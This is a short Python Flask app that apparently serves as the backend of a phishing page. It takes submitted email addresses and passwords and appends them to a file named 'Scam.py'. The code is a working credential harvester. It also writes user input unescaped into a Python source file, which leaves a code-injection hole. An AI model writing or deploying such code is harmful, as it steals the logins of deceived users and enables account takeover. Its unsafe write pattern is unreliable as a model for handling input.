# importing Flask and other modules
from flask import Flask, request, render_template

# Flask constructor
app = Flask(__name__)

# A decorator used to tell the application
# which URL is associated function
@app.route('/', methods =["GET", "POST"])
def Request():
    if request.method == "POST":
        lb = '{'
        rb = '}'
        email = request.form.get('email')
        password = request.form.get('password')
        with open('Scam.py', 'a') as w:
                w.write(f'\nUsers["{email}"] = {lb}"Password": "{password}"{rb}')
    return render_template('index.html')


    
              

if __name__=='__main__':
    app.run(debug=False)
